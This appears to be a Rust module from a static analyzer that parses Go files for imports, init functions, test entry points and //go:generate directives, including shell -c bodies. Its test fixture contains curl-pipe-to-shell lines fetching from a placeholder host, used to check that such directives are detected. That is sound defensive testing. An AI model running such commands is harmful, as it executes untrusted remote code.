//! Go execution contexts. These are potential entry points, not proof that a
//! package is selected for a particular GOOS/GOARCH, build tag, or test run.
use crate::Values;
use serde_json::json;
use std::collections::HashMap;
use tree_sitter::Node;

fn children(node: Node<'_>) -> Vec<Node<'_>> {
    let mut cursor = node.walk();
    node.named_children(&mut cursor).collect()
}

pub(super) fn imports(root: Node<'_>, source: &str) -> HashMap<String, String> {
    let mut out = HashMap::new();
    let mut stack = vec![root];
    while let Some(node) = stack.pop() {
        if node.kind() == "import_spec" {
            if let Some(path) = node.child_by_field_name("path") {
                let path = source[path.byte_range()].trim_matches(['"', '`']);
                let alias = node
                    .child_by_field_name("name")
                    .map(|n| &source[n.byte_range()])
                    .unwrap_or_else(|| path.rsplit('/').next().unwrap_or(path));
                if !matches!(alias, "." | "_") {
                    out.insert(alias.into(), path.into());
                }
            }
        } else if node.kind() != "function_declaration" {
            stack.extend(children(node));
        }
    }
    out
}

// go generate uses Go-quoted arguments, not shell tokenization. No commands or
// environment expansion are performed by this analyzer. Variable arguments
// remain visibly unresolved. Single quotes are ordinary argument characters.
fn words(line: &str) -> Option<Vec<String>> {
    let mut rest = line.trim();
    let mut out = Vec::new();
    while !rest.is_empty() {
        if rest.starts_with('"') {
            let mut escaped = false;
            let mut end = None;
            for (i, c) in rest.char_indices().skip(1) {
                if !escaped && c == '"' {
                    end = Some(i + 1);
                    break;
                }
                escaped = !escaped && c == '\\';
            }
            let end = end?;
            let word = &rest[..end];
            rest = &rest[end..];
            if !rest.is_empty() && !rest.starts_with([' ', '\t']) {
                return None;
            }
            out.push(super::decode_source_escapes(&word[1..word.len() - 1]));
        } else {
            let end = rest.find([' ', '\t']).unwrap_or(rest.len());
            out.push(rest[..end].to_string());
            rest = &rest[end..];
        }
        rest = rest.trim_start();
        if out.len() > 256 {
            return None;
        }
    }
    Some(out)
}

pub(super) fn execution_facts(root: Node<'_>, source: &str, values: &mut Values) {
    let mut init_count = 0;
    let mut globals = 0;
    let mut tests = Vec::new();
    let mut package = "";
    for node in children(root) {
        match node.kind() {
            "package_clause" => {
                if let Some(n) = node.named_child(0) {
                    package = &source[n.byte_range()];
                }
            }
            "function_declaration" => {
                if let Some(n) = node.child_by_field_name("name") {
                    let name = &source[n.byte_range()];
                    if name == "init" {
                        init_count += 1;
                    }
                    if ["Test", "Benchmark", "Fuzz", "Example"]
                        .iter()
                        .any(|p| name.starts_with(p))
                    {
                        tests.push(name);
                    }
                }
            }
            "var_declaration" => {
                let mut stack = children(node);
                while let Some(n) = stack.pop() {
                    if n.kind() == "var_spec" && n.child_by_field_name("value").is_some() {
                        globals += 1;
                    } else {
                        stack.extend(children(n));
                    }
                }
            }
            _ => {}
        }
    }
    let mut directives = Vec::new();
    let mut aliases: HashMap<String, Vec<String>> = HashMap::new();
    let mut malformed = false;
    for (line, text) in source.lines().enumerate() {
        // Match cmd/go's exact line prefix, even inside raw strings: generate
        // explicitly does not parse Go source. Indented/examples do not execute.
        let Some(rest) = text
            .strip_prefix("//go:generate")
            .filter(|s| s.starts_with([' ', '\t']))
        else {
            continue;
        };
        let Some(mut args) = words(rest) else {
            malformed = true;
            continue;
        };
        if args.first().is_some_and(|s| s == "-command") {
            if args.len() >= 3 {
                aliases.insert(args[1].clone(), args[2..].to_vec());
            } else {
                malformed = true;
            }
            continue;
        }
        if let Some(expanded) = args.first().and_then(|s| aliases.get(s)).cloned() {
            args.splice(..1, expanded);
        }
        if args.is_empty() {
            continue;
        }
        let command = args[0].rsplit('/').next().unwrap_or(&args[0]);
        let shell = matches!(command, "sh" | "bash" | "dash" | "zsh");
        let body = if shell && args.get(1).is_some_and(|s| s == "-c") {
            args.get(2)
        } else {
            None
        };
        directives.push(json!({"line":line+1,"argv":args,"shell_body":body}));
        if directives.len() >= 1024 {
            malformed = true;
            break;
        }
    }
    values.insert("source.go.package", json!(package));
    values.insert("source.go.init_count", json!(init_count));
    values.insert("source.go.global_initializer_count", json!(globals));
    values.insert("source.go.test_entry_candidates", json!(tests));
    values.insert("source.go.generate", json!(directives));
    values.insert("source.go.generate_incomplete", json!(malformed));
}

#[cfg(test)]
mod tests {
    use super::*;
    #[test]
    fn generate_arguments_are_not_implicitly_shell() {
        let source = "package p\n//go:generate curl https://example.invalid/p | sh\n//go:generate -command shell sh -c\n//go:generate shell \"curl https://example.invalid/p | sh\"\n //go:generate sh -c \"curl x | sh\"\n";
        let parsed =
            crate::open_with_path(std::path::Path::new("p.go"), source.as_bytes()).unwrap();
        let directives = parsed.values().get("source.go.generate").unwrap();
        assert_eq!(directives.as_array().unwrap().len(), 2);
        assert_eq!(directives[0]["shell_body"], json!(null));
        assert_eq!(
            directives[1]["shell_body"],
            json!("curl https://example.invalid/p | sh")
        );
        assert!(words("sh -c \"unterminated").is_none());
    }
}
